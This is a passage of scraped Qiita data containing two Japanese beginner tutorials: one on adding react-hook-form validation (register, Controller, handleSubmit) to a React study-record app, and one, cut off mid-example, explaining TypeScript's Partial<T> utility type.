onSubmit={handleSubmit(onRecordRegist)}>`を記載しました。\n\nhttps://react-hook-form.com/docs/useform/handlesubmit\n\n**公式ドキュメントより引用**\n>This function will receive the form data if form validation is successful.\n>> 日本語訳：この関数は、フォームのバリデーションが成功した場合にフォームデータを受け取ります。\n\nhandleSubmitの引数に指定した、`関数(onRecordRegist)はバリデーションが成功した場合、\nonRecordRegistを実行`します。\nまた、`data`にはフォームから受け取ったデータを取得できます。\n\nuseStateで設定していた処理は削除しました。\n\nreac-hook-formを使用するために、カスタムフックの`useForm`を追加しました。\nuseFormを使うことで、フォームの管理が可能になります。\n\nhttps://react-hook-form.com/docs/useform\n\n```diff_tsx:App.tsx\nimport { ChangeEvent, useEffect, useState } from \"react\";\nimport { addStudyRecord, GetAllStudyRecords } from \"./lib/study-record\";\nimport { Record } from \"./domain/record\";\nimport { BsPencil } from \"react-icons/bs\";\nimport React from \"react\";\n+ import { useForm, SubmitHandler, Controller } from \"react-hook-form\";\n\nfunction App() {\n  const [studyRecords, setStudyRecords] = useState<Record[]>([]);\n  const [isLoading, setIsLoading] = useState(true);\n  const { isOpen, onOpen, onClose } = useDisclosure();\n-  const initialRef = React.useRef(null);\n-  const [title, setTitle] = useState(\"\"); // useStateを使い学習内容をセットしていた処理を削除\n-  const [time, setTime] = useState(0); // useStateを使い学習時間をセットしていた処理を削除\n+  const {\n+    register,\n+    handleSubmit,\n+    formState: { errors },\n+    setValue,\n+    control,\n+  } = useForm<Partial<Record>>()\n  const getAllStudyRecords = async () => {\n    const records = await GetAllStudyRecords();\n    setStudyRecords(records);\n    setIsLoading(false);\n  };\n  useEffect(() => {\n    getAllStudyRecords();\n  }, []);\n-  const onRecordRegist = async () => {\n+  const onRecordRegist: SubmitHandler<Partial<Record>> = async (data) => {\n    const insertData: Partial<Record> = {};\n+    insertData.title = data.title;\n+    insertData.time = data.time;\n-    insertData.title = title;\n-    insertData.time = time;\n    await addStudyRecord(insertData);\n    getAllStudyRecords();\n    onClose();\n  };\n```\n## 6.registerの導入\n学習内容欄（title）に`register`を導入し、バリデーションを追加しました。\n\nhttps://react-hook-form.com/docs/useform/register\n\n**公式ドキュメントより引用**\n>This method allows you to register an input or select element and apply validation rules to React Hook Form. Validation rules are all based on the HTML standard and also allow for custom validation methods.\n>>日本語訳：このメソッドでは、input または select 要素を登録し、React Hook Form にバリデーションルールを適用できます。バリデーションルールはすべて HTML 標準に基づいており、カスタムバリデーションも可能です。\n\n\n```tsx:App.tsx\n                <ModalBody>\n                  <FormControl>\n                    <FormLabel>学習内容</FormLabel>\n                    <Input\n                      {...register(\"title\", { required: true })}\n                      placeholder=\"学習内容\"\n                    />\n                    {/* エラーの表示 */}\n                    {errors.title?.type === \"required\" && (\n                      <p style={{ color: \"red\" }}>学習内容は必須です</p>\n                    )}\n                  </FormControl>\n             　　</ModalBody>\n```\n\n`{...register(\"title\", { required: true })}`\n* `\"title\"`:登録するフィールドの名前\n* `{ required: true }`:必須項目のバリデーションルールを設定\n* `…`：JavaScriptのスプレッド構文、registerが生成した属性を展開\n\n```tsx\n<Input\n{...register(\"title\", { required: true })}\nplaceholder=\"学習内容\"\n/>\n{/* 実際はこのように展開されている */}\n<Input\n  name=\"title\"\n  onChange={[Function]}\n  onBlur={[Function]}\n  ref={[Function]}\n  placeholder=\"学習内容\"\n/>\n```\n\n\n\n## 7.Controllerの導入\n\nhttps://react-hook-form.com/docs/usecontroller/controller\n\n勉強時間の入力欄にはChakraUIのNumberInputを使用していました。\nChakraUIのNumberInputなどの複雑なinput要素にはregisterが使えないため、`Controller`を導入しました。\n\n`register`は`標準のHTMLフォーム要素（\\<input>など）に直接適用するように設計`されていますが、ChakuraUIのNumberInputなど`複数の要素から成り立っているカスタムコンポーネント`には、registerは使用できません。\n\n```tsx:App.tsx\n<Controller\n  name=\"time\"  // フォーム内での識別名\n  control={control}  // React Hook Formのコントロールオブジェクト\n  rules={{ required: true, min: 0 }}  // バリデーションルール\n  render={({ field }) => (  // レンダリング関数\n    <NumberInput\n      value={field.value}  // Controllerから受け取った値、「現在の値」(フォームの状態)\n      onChange={(valueString) => {  // 「新しく入力された値」(変更イベントの引数)、変更があると文字列として受け取る\n        field.onChange(parseInt(valueString));  // 文字列を数値に変換してからフォームに反映\n      }}\n    >\n      <NumberInputField />\n      {/* エラーの表示 */}\n      {errors.time?.type === \"required\" && (\n        <p style={{ color: \"red\" }}>学習時間は必須です</p>\n      )}\n      {errors.time?.type === \"min\" && (\n        <p style={{ color: \"red\" }}>\n          時間は0以上である必要があります\n        </p>\n      )}\n      <NumberInputStepper>\n        <NumberIncrementStepper />\n        <NumberDecrementStepper />\n      </NumberInputStepper>\n    </NumberInput>\n  )}\n/>\n```\n\n`name`:登録するフィールドの名称\n`rules`:必須項目、最小値=0のバリデーションルールを設定\n`render`:コントローラーから受け取った値を元に、フォームに設定\n\n# 導入完了\n\n![バリデーション.gif](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/00b851af-aca5-47ff-906a-769619b5aef8.gif)\n\n\n# おわりに\nreact-hook-formを使うことで、容易にバリデーション、フォームデータを取り扱えることを学びました。\nドキュメントを参照しつつ、自分のプロダクトに取り込むコツが少しずつ掴めてきたと感じています。\n\n\n# 参考\nhttps://react-hook-form.com/\n","coediting":false,"comments_count":0,"created_at":"2025-04-14T21:09:30+09:00","group":null,"id":"d5f63656750ac9ff6e7a","likes_count":3,"private":false,"reactions_count":0,"stocks_count":2,"tags":[{"name":"初心者","versions":[]},{"name":"React","versions":[]},{"name":"react-hook-form","versions":[]}],"title":"【react-hook-form】react-hook-formを導入してみた","updated_at":"2025-04-14T21:11:04+09:00","url":"https://qiita.com/asa129/items/d5f63656750ac9ff6e7a","user":{"description":"0→1でWebアプリケーションを作れるようになるために奮闘中です。\r\nアイコンは@chinchilla.maruさん\r\nhttps://www.instagram.com/chinchilla.maru/","facebook_id":"","followees_count":45,"followers_count":53,"github_login_name":"asa129","id":"asa129","items_count":62,"linkedin_id":"","location":"","name":"","organization":"","permanent_id":3993509,"profile_image_url":"https://s3-ap-northeast-1.amazonaws.com/qiita-image-store/0/3993509/ea9105b8f7fedddb7175e913eeb5c288385a364a/large.png?1739071881","team_only":false,"twitter_screen_name":"jad1290","website_url":""},"page_views_count":689,"team_membership":null,"organization_url_name":"jisou","slide":false},{"rendered_body":"<h1 data-sourcepos=\"1:1-1:14\">\n<span id=\"はじめに\" class=\"fragment\"></span><a href=\"#%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB\"><i class=\"fa fa-link\"></i></a>はじめに</h1>\n<p data-sourcepos=\"2:1-3:93\">TypeScriptの学習を進めていて、<code>Partial&lt;T&gt;</code>という型があることを学びました。<br>\n<code>Partial&lt;T&gt;</code>の概要と、使用メリットについて学んだことをまとめます。</p>\n<h1 data-sourcepos=\"5:1-5:19\">\n<span id=\"partialtとは\" class=\"fragment\"></span><a href=\"#partialt%E3%81%A8%E3%81%AF\"><i class=\"fa fa-link\"></i></a>Partial&lt;T&gt;とは</h1>\n<p data-sourcepos=\"6:1-6:41\"><strong>サバイバルTypeScriptより引用</strong></p>\n<blockquote data-sourcepos=\"7:1-8:104\">\n<p data-sourcepos=\"7:2-7:148\">Partial&lt;T&gt;は、オブジェクトの型Tのすべてのプロパティをオプションプロパティにするユーティリティ型です。</p>\n<blockquote data-sourcepos=\"8:2-8:104\">\n<p data-sourcepos=\"8:3-8:104\">ユーティリティ型 (utility type)は、型から別の型を導き出してくれる型です。</p>\n</blockquote>\n</blockquote>\n<h1 data-sourcepos=\"10:1-10:37\">\n<span id=\"partialtの基本的な使い方\" class=\"fragment\"></span><a href=\"#partialt%E3%81%AE%E5%9F%BA%E6%9C%AC%E7%9A%84%E3%81%AA%E4%BD%BF%E3%81%84%E6%96%B9\"><i class=\"fa fa-link\"></i></a>Partial&lt;T&gt;の基本的な使い方</h1>\n<p data-sourcepos=\"11:1-11:61\">例えば、以下のtypeを定義していたとします。</p>\n<div class=\"code-frame\" data-lang=\"ts\" data-sourcepos=\"13:1-29:3\">\n<div class=\"code-lang\"><span class=\"bold\">type.ts</span></div>\n<div class=\"highlight\"><pre><code><span class=\"k\">export</span> <span class=\"kd\">type</span> <span class=\"nx\">Data</span> <span class=\"o\">=</span> <span class=\"p\">{</span>\n  <span class=\"na\">id</span><span class=\"p\">:</span> <span class=\"kr\">string</span><span class=\"p\">;</span>\n  <span class=\"nl\">title</span><span class=\"p\">:</span> <span class=\"kr\">string</span><span class=\"p\">;</span>\n  <span class=\"nl\">time</span><span class=\"p\">:</span> <span class=\"kr\">number</span><span class=\"p\">;</span>\n  <span class=\"nl\">created_at</span><span class=\"p\">:</span> <span class=\"kr\">string</span><span class=\"p\">;</span>\n<span class=\"p\">};</span>\n\n<span class=\"kd\">const</span> <span class=\"nx\">data</span><span class=\"p\">:</span> <span class=\"nx\">Data</span> <span class=\"o\">=</span> <span class=\"p\">{</span>\n  <span class=\"na\">id</span><span class=\"p\">:</span> <span class=\"dl\">\"</span><span class=\"s2\">1</span><span class=\"dl\">\"</span><span class=\"p\">,</span>\n  <span class=\"na\">title</span><span class=\"p\">:</span> <span class=\"dl\">\"</span><span class=\"s2\">タイトル</span><span class=\"dl\">\"</span><span class=\"p\">,</span>\n  <span class=\"na\">time</span><span class=\"p\">:</span> <span class=\"mi\">1</span><span class=\"p\">,</span>\n  <span class=\"na\">created_at</span><span class=\"p\">:</span> <span class=\"dl\">\"</span><span class=\"s2\">2025-04-06</span><span class=\"dl\">\"</span><span class=\"p\">,</span>\n<span class=\"p\">};</span>\n\n<span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nf\">log</span><span class=\"p\">(</span><span class=\"nx\">data</span><span class=\"p\">);</span>\n</code></pre></div>\n</div>\n<p data-sourcepos=\"30:1-30:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F79f7dc78-b8db-4e5e-8631-9ad5710f2d02.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=b0640a9ee39f435793b6f7b002ed25cc\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F79f7dc78-b8db-4e5e-8631-9ad5710f2d02.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=b0640a9ee39f435793b6f7b002ed25cc\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F79f7dc78-b8db-4e5e-8631-9ad5710f2d02.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=b91e24a87a54141ab444aef912631f48 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/79f7dc78-b8db-4e5e-8631-9ad5710f2d02.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"32:1-33:122\">この場合、全てのプロパティを指定しないとコンパイルエラーになります。<br>\n<a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F40b190e2-73c4-4615-8cad-07fcbbf37f1f.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=4bf5279f78e85503a557682edcc62874\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F40b190e2-73c4-4615-8cad-07fcbbf37f1f.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=4bf5279f78e85503a557682edcc62874\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F40b190e2-73c4-4615-8cad-07fcbbf37f1f.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=3f962593ce4bc60e3a0f84d2830c725c 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/40b190e2-73c4-4615-8cad-07fcbbf37f1f.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"35:1-36:128\"><code>export type Data = {}</code>の各プロパティを全てオプションにしたいとき、各プロパティに<code>?</code>をつけることで可能です。<br>\nしかし、仮にプロパティが何10個もあるようなデータ型だと、全てに<code>?</code>をつけるのは大変です。</p>\n<p data-sourcepos=\"38:1-38:117\">その時に<code>Partial</code>を使用すると簡潔に各プロパティをオプションにすることができます。</p>\n<div class=\"code-frame\" data-lang=\"ts\" data-sourcepos=\"39:1-49:3\">\n<div class=\"code-lang\"><span class=\"bold\">type.ts</span></div>\n<div class=\"highlight\"><pre><code><span class=\"k\">export</span> <span class=\"kd\">type</span> <span class=\"nx\">Data</span> <span class=\"o\">=</span> <span class=\"p\">{</span>\n  <span class=\"na\">id</span><span class=\"p\">:</span> <span class=\"kr\">string</span><span class=\"p\">;</span>\n  <span class=\"nl\">title</span><span class=\"p\">:</span> <span class=\"kr\">string</span><span class=\"p\">;</span>\n  <span class=\"nl\">time</span><span class=\"p\">:</span> <span class=\"kr\">number</span><span class=\"p\">;</span>\n  <span class=\"nl\">created_at</span><span class=\"p\">:</span> <span class=\"kr\">string</span><span class=\"p\">;</span>\n<span class=\"p\">};</span>\n\n<span class=\"c1\">// 既存のDataのプロパティを全てオプションにする</span>\n<span class=\"k\">export</span> <span class=\"kd\">type</span> <span class=\"nx\">newData</span> <span class=\"o\">=</span> <span class=\"nb\">Partial</span><span class=\"o\">&lt;</span><span class=\"nx\">Data</span><span class=\"o\">&gt;</span><span class=\"p\">;</span>\n</code></pre></div>\n</div>\n<p data-sourcepos=\"51:1-51:73\">この結果、内部的にnewDataは次のように変換されます。</p>\n<div class=\"code-frame\" data-lang=\"ts\" data-sourcepos=\"52:1-59:3\"><div class=\"highlight\"><pre><code><span class=\"k\">export</span> <span class=\"kd\">type</span> <span class=\"nx\">newData</span> <span class=\"o\">=</span> <span class=\"p\">{</span>\n  <span class=\"nx\">id</span><span class=\"p\">?:</span> <span class=\"kr\">string</span> <span class=\"o\">|</span> <span class=\"kc\">undefined</span><span class=\"p\">;</span>\n  <span class=\"nl\">title</span><span class=\"p\">?:</span> <span class=\"kr\">string</span> <span class=\"o\">|</span> <span class=\"kc\">undefined</span><span class=\"p\">;</span>\n  <span class=\"nl\">time</span><span class=\"p\">?:</span> <span class=\"kr\">number</span> <span class=\"o\">|</span> <span class=\"kc\">undefined</span><span class=\"p\">;</span>\n  <span class=\"nl\">created_at</span><span class=\"p\">?:</span> <span class=\"kr\">string</span> <span class=\"o\">|</span> <span class=\"kc\">undefined</span><span class=\"p\">;</span>\n<span class=\"p\">};</span>\n</code></pre></div></div>\n<div class=\"code-frame\" data-lang=\"ts\" data-sourcepos=\"61:1-67:3\"><div class=\"highlight\"><pre><code><span class=\"c1\">// timeプロパティのみ指定</span>\n<span class=\"kd\">const</span> <span class=\"nx\">newData</span><span class=\"p\">:</span> <span class=\"nx\">newData</span> <span class=\"o\">=</span> <span class=\"p\">{</span>\n  <span class=\"na\">time</span><span class=\"p\">:</span> <span class=\"mi\">1</span><span class=\"p\">,</span>\n<span class=\"p\">};</span>\n<span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nf\">log</span><span class=\"p\">(</span><span class=\"nx\">newData</span><span class=\"p\">);</span>\n</code></pre></div></div>\n<p data-sourcepos=\"68:1-69:122\">timeプロパティのみ指定した実行結果は下記のようになります<br>\n<a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fe157bc04-0a40-47d4-9f84-00d3a3c2d6f1.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=c6945702c4079830392f98f3f83a69ae\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fe157bc04-0a40-47d4-9f84-00d3a3c2d6f1.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=c6945702c4079830392f98f3f83a69ae\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fe157bc04-0a40-47d4-9f84-00d3a3c2d6f1.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=9514fcae3bbdce5c19ea6d311a7a3083 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/e157bc04-0a40-47d4-9f84-00d3a3c2d6f1.png\" loading=\"lazy\"></a></p>\n<h1 data-sourcepos=\"73:1-73:31\">\n<span id=\"partialtの使いどころ\" class=\"fragment\"></span><a href=\"#partialt%E3%81%AE%E4%BD%BF%E3%81%84%E3%81%A9%E3%81%93%E3%82%8D\"><i class=\"fa fa-link\"></i></a>Partial&lt;T&gt;の使いどころ</h1>\n<p data-sourcepos=\"74:1-74:102\">主な使用例は下記の通りです。各使用例とメリットについてまとめました。</p>\n<ol data-sourcepos=\"75:1-79:0\">\n<li data-sourcepos=\"75:1-75:60\">オブジェクトの一部だけを更新したいとき</li>\n<li data-sourcepos=\"76:1-76:36\">フォーム入力の状態管理</li>\n<li data-sourcepos=\"77:1-79:0\">テストデータの作成</li>\n</ol>\n<h3 data-sourcepos=\"80:1-80:63\">\n<span id=\"1オブジェクトの一部だけを更新したいとき\" class=\"fragment\"></span><a href=\"#1%E3%82%AA%E3%83%96%E3%82%B8%E3%82%A7%E3%82%AF%E3%83%88%E3%81%AE%E4%B8%80%E9%83%A8%E3%81%A0%E3%81%91%E3%82%92%E6%9B%B4%E6%96%B0%E3%81%97%E3%81%9F%E3%81%84%E3%81%A8%E3%81%8D\"><i class=\"fa fa-link\"></i></a>1.オブジェクトの一部だけを更新したいとき</h3>\n<h4 data-sourcepos=\"81:1-81:62\">\n<span id=\"データの一部だけを更新したいときに使用\" class=\"fragment\"></span><a href=\"#%E3%83%87%E3%83%BC%E3%82%BF%E3%81%AE%E4%B8%80%E9%83%A8%E3%81%A0%E3%81%91%E3%82%92%E6%9B%B4%E6%96%B0%E3%81%97%E3%81%9F%E3%81%84%E3%81%A8%E3%81%8D%E3%81%AB%E4%BD%BF%E7%94%A8\"><i class=\"fa fa-link\"></i></a>データの一部だけを更新したいときに使用</h4>\n<p data-sourcepos=\"82:1-83:168\">例として、ユーザー情報の名前だけ変更したい場合を考えてみます<br>\n本来はユーザー情報全てのプロパティを指定しないといけない所、<code>Partial&lt;T&gt;</code>を使うことで名前だけ更新することができます。</p>\n<div class=\"code-frame\" data-lang=\"ts\" data-sourcepos=\"85:1-113:3\"><div class=\"highlight\"><pre><code><span class=\"kr\">interface</span> <span class=\"nx\">User</span> <span class=\"p\">{</span>\n  <span class=\"nl\">id</span><span class=\"p\">:</span> <span class=\"kr\">number</span><span class=\"p\">;</span>\n  <span class=\"nl\">name</span><span class=\"p\">:</span> <span class=\"kr\">string</span><span class=\"p\">;</span>\n  <span class=\"nl\">email</span><span class=\"p\">:</span> <span class=\"kr\">string</span><span class=\"p\">;</span>\n  <span class=\"nl\">age</span><span class=\"p\">:</span> <span class=\"kr\">number</span><span class=\"p\">;</span>\n<span class=\"p\">}</span>\n\n<span class=\"c1\">// ❌ Partialなしの場合（すべてのプロパティが必要）</span>\n<span class=\"kd\">const</span> <span class=\"nx\">updateUserWithoutPartial</span> <span class=\"o\">=</span> <span class=\"p\">(</span><span class=\"nx\">user</span><span class=\"p\">:</span> <span class=\"nx\">User</span><span class=\"p\">)</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n  <span class=\"c1\">// 更新処理</span>\n<span class=\"p\">};</span>\n\n<span class=\"c1\">// このように呼び出す必要がある（すべてのプロパティを指定）</span>\n<span class=\"nf\">updateUserWithoutPartial</span><span class=\"p\">({</span>\n  <span class=\"na\">id</span><span class=\"p\">:</span> <span class=\"mi\">1</span><span class=\"p\">,</span>\n  <span class=\"na\">name</span><span class=\"p\">:</span> <span class=\"dl\">\"</span><span class=\"s2\">なまえ</span><span class=\"dl\">\"</span><span class=\"p\">,</span>\n  <span class=\"na\">email</span><span class=\"p\">:</span> <span class=\"dl\">\"</span><span class=\"s2\">name@example.com</span><span class=\"dl\">\"</span><span class=\"p\">,</span>\n  <span class=\"na\">age</span><span class=\"p\">:</span> <span class=\"mi\">20</span>\n<span class=\"p\">});</span>\n\n<span class=\"c1\">// ✅ Partialを使った場合（一部のプロパティだけでOK）</span>\n<span class=\"kd\">const</span> <span class=\"nx\">updateUser</span> <span class=\"o\">=</span> <span class=\"p\">(</span><span class=\"nx\">userId</span><span class=\"p\">:</span> <span class=\"kr\">number</span><span class=\"p\">,</span> <span class=\"nx\">updates</span><span class=\"p\">:</span> <span class=\"nb\">Partial</span><span class=\"o\">&lt;</span><span class=\"nx\">User</span><span class=\"o\">&gt;</span><span class=\"p\">)</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n  <span class=\"c1\">// userIdで既存データを取得、updatesの内容で更新</span>\n<span class=\"p\">};</span>\n\n<span class=\"c1\">// 名前だけ更新で済む</span>\n<span class=\"nf\">updateUser</span><span class=\"p\">(</span><span class=\"mi\">1</span><span class=\"p\">,</span> <span class=\"p\">{</span> <span class=\"na\">name</span><span class=\"p\">:</span> <span class=\"dl\">\"</span><span class=\"s2\">田中あああ</span><span class=\"dl\">\"</span> <span class=\"p\">});</span>\n</code></pre></div></div>\n<h3 data-sourcepos=\"115:1-115:33\">\n<span id=\"2フォーム状態の管理\" class=\"fragment\"></span><a href=\"#2%E3%83%95%E3%82%A9%E3%83%BC%E3%83%A0%E7%8A%B6%E6%85%8B%E3%81%AE%E7%AE%A1%E7%90%86\"><i class=\"fa fa-link\"></i></a>2.フォーム状態の管理</h3>\n<h4 data-sourcepos=\"116:1-116:59\">\n<span id=\"不完全な状態や任意の項目のときに使用\" class=\"fragment\"></span><a href=\"#%E4%B8%8D%E5%AE%8C%E5%85%A8%E3%81%AA%E7%8A%B6%E6%85%8B%E3%82%84%E4%BB%BB%E6%84%8F%E3%81%AE%E9%A0%85%E7%9B%AE%E3%81%AE%E3%81%A8%E3%81%8D%E3%81%AB%E4%BD%BF%E7%94%A8\"><i class=\"fa fa-link\"></i></a>不完全な状態や任意の項目のときに使用</h4>\n<p data-sourcepos=\"117:1-119:126\">例として、入力途中のデータを保存したいときを考えてみます。<br>\n<code>Partial&lt;T&gt;</code>を使用しない場合、登録項目をすべて指定しないと、登録できません。<br>\n名前だけを途中で保存したいとき、<code>Partial&lt;T&gt;</code>を使うことで名前だけ登録することができます。</p>\n<div class=\"code-frame\" data-lang=\"ts\" data-sourcepos=\"121:1-154:3\"><div class=\"highlight\"><pre><code><span class=\"c1\">// ユーザー情報の型</span>\n<span class=\"kd\">type</span> <span class=\"nx\">UserForm</span> <span class=\"o\">=</span> <span class=\"p\">{</span>\n  <span class=\"na\">name</span><span class=\"p\">:</span> <span class=\"kr\">string</span><span class=\"p\">;</span>\n  <span class=\"nl\">email</span><span class=\"p\">:</span> <span class=\"kr\">string</span><span class=\"p\">;</span>\n  <span class=\"nl\">age</span><span class=\"p\">:</span> <span class=\"kr\">number</span><span class=\"p\">;</span>\n  <span class=\"nl\">address</span><span class=\"p\">:</span> <span class=\"kr\">string</span><span class=\"p\">;</span>\n<span class=\"p\">};</span>\n\n<span class=\"c1\">// ❌ Partialなしの場合（すべてのプロパティが必要）</span>\n<span class=\"c1\">// ユーザー登録関数</span>\n<span class=\"kd\">function</span> <span class=\"nf\">registerUser</span><span class=\"p\">(</span><span class=\"nx\">user</span><span class=\"p\">:</span> <span class=\"nx\">UserForm</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n  <span class=\"c1\">// ユーザー登録処理</span>\n  <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nf\">log</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">ユーザーを登録しました:</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"nx\">user</span><span class=\"p\">);</span>\n<span class=\"p\">}</span>\n\n<span class=\"c1\">// 使用例（全ての情報が必要）</span>\n<span class=\"nf\">registerUser</span><span class=\"p\">({</span>\n  <span class=\"na\">name</span><span class=\"p\">:</span> <span class=\"dl\">\"</span><span class=\"s2\">山田あああ</span><span class=\"dl\">\"</span><span class=\"p\">,</span>\n  <span class=\"na\">email</span><span class=\"p\">:</span> <span class=\"dl\">\"\"</span><span class=\"p\">,</span>   <span class=\"c1\">//名前のみ登録したい場合、空文字を指定する必要がある</span>\n  <span class=\"na\">age</span><span class=\"p\">:</span> <span class=\"mi\">0</span><span class=\"p\">,</span>      <span class=\"c1\">//名前のみ登録したい場合、初期値を指定する必要がある</span>\n  <span class=\"na\">address</span><span class=\"p\">:</span> <span class=\"dl\">\"\"</span>  <span class=\"c1\">//住所のみ登録したい場合、空文字を指定する必要がある</span>\n<span class=\"p\">});</span>\n\n<span class=\"c1\">// ✅ Partialを使った場合（一部のプロパティだけでOK）</span>\n<span class=\"kd\">function</span> <span class=\"nf\">registerUser</span><span class=\"p\">(</span><span class=\"nx\">user</span><span class=\"p\">:</span> <span class=\"nb\">Partial</span><span class=\"o\">&lt;</span><span class=\"nx\">UserForm</span><span class=\"o\">&gt;</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n  <span class=\"c1\">// ユーザー登録処理</span>\n  <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nf\">log</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">ユーザーを登録しました:</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"nx\">user</span><span class=\"p\">);</span>\n<span class=\"p\">}</span>\n\n<span class=\"nf\">registerUser</span><span class=\"p\">({</span>\n  <span class=\"na\">name</span><span class=\"p\">:</span> <span class=\"dl\">\"</span><span class=\"s2\">山田あああ</span><span class=\"dl\">\"</span><span class=\"p\">,</span>\n<span class=\"p\">});</span>\n</code></pre></div></div>\n<h3 data-sourcepos=\"157:1-157:33\">\n<span id=\"3テストデータの作成\" class=\"fragment\"></span><a href=\"#3%E3%83%86%E3%82%B9%E3%83%88%E3%83%87%E3%83%BC%E3%82%BF%E3%81%AE%E4%BD%9C%E6%88%90\"><i class=\"fa fa-link\"></i></a>3.テストデータの作成</h3>\n<h4 data-sourcepos=\"158:1-158:104\">\n<span id=\"ユーザー情報の一部分のみを変えて大量にテストデータを作成したいとき\" class=\"fragment\"></span><a href=\"#%E3%83%A6%E3%83%BC%E3%82%B6%E3%83%BC%E6%83%85%E5%A0%B1%E3%81%AE%E4%B8%80%E9%83%A8%E5%88%86%E3%81%AE%E3%81%BF%E3%82%92%E5%A4%89%E3%81%88%E3%81%A6%E5%A4%A7%E9%87%8F%E3%81%AB%E3%83%86%E3%82%B9%E3%83%88%E3%83%87%E3%83%BC%E3%82%BF%E3%82%92%E4%BD%9C%E6%88%90%E3%81%97%E3%81%9F%E3%81%84%E3%81%A8%E3%81%8D\"><i class=\"fa fa-link\"></i></a>ユーザー情報の一部分のみを変えて大量にテストデータを作成したいとき</h4>\n<p data-sourcepos=\"159:1-160:108\"><code>Partial&lt;T&gt;</code>を使用しない場合、登録項目をすべて指定しないと、ユーザー情報を作成できません。<br>\n<code>Partial&lt;T&gt;</code>を使うことで一部分のみ変更して、データを作成することができます。</p>\n<div class=\"code-frame\" data-lang=\"ts\" data-sourcepos=\"162:1-211:3\"><div class=\"highlight\"><pre><code><span class=\"kd\">type</span> <span class=\"nx\">User</span> <span class=\"o\">=</span> <span class=\"p\">{</span>\n  <span class=\"na\">id</span><span class=\"p\">:</span> <span class=\"kr\">number</span><span class=\"p\">,</span>\n  <span class=\"na\">name</span><span class=\"p\">:</span> <span class=\"kr\">string</span><span class=\"p\">,</span>\n  <span class=\"na\">email</span><span class=\"p\">:</span> <span class=\"kr\">string</span><span class=\"p\">,</span>\n  <span class=\"na\">age</span><span class=\"p\">:</span> <span class=\"kr\">number</span><span class=\"p\">,</span>\n  <span class=\"na\">isActive</span><span class=\"p\">:</span> <span class=\"nx\">boolean</span>\n<span class=\"p\">}</span>\n\n<span class=\"c1\">// ❌ Partialなしの場合（すべてのプロパティが必要）</span>\n<span class=\"c1\">// 全プロパティを指定、一つずつ作成が必要</span>\n<span class=\"kd\">const</span> <span class=\"nx\">user1</span> <span class=\"o\">=</span> <span class=\"p\">{</span>\n  <span class=\"na\">id</span><span class=\"p\">:</span> <span class=\"mi\">1</span><span class=\"p\">,</span>\n  <span class=\"na\">name</span><span class=\"p\">:</span> <span class=\"dl\">\"</span><span class=\"s2\">テスト花子</span><span class=\"dl\">\"</span><span class=\"p\">,</span>\n  <span class=\"na\">email</span><span class=\"p\">:</span> <span class=\"dl\">\"</span><span class=\"s2\">hanako@example.com</span><span class=\"dl\">\"</span><span class=\"p\">,</span>\n  <span class=\"na\">age</span><span class=\"p\">:</span> <span class=\"mi\">25</span><span class=\"p\">,</span>\n  <span class=\"na\">isActive</span><span class=\"p\">:</span> <span class=\"kc\">true</span>\n<span class=\"p\">};</span>\n\n<span class=\"kd\">const</span> 